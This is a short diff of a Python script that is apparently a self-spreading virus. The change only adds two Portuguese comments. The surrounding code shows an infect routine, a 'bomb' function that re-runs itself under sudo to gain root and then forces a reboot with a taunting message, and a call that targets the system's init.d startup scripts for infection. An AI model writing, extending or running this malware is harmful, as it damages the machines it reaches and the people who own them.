@@ -36,10 +36,12 @@ def infect(filestoinfect):
         f.close()
 
 def bomb():
+    #conseguindo permissão de superuser
         euid = os.geteuid()
         if euid != 0:
             args = ['sudo', sys.executable] + sys.argv + [os.environ]
             os.execlpe('sudo', *args)
+    #computador reiniciado em 1 minuto
         os.system("shutdown -r 1 Seu computador será reiniciado... DENOVO")
 
 filestoinfect = search(os.path.abspath("/etc/rc.d/init.d"))
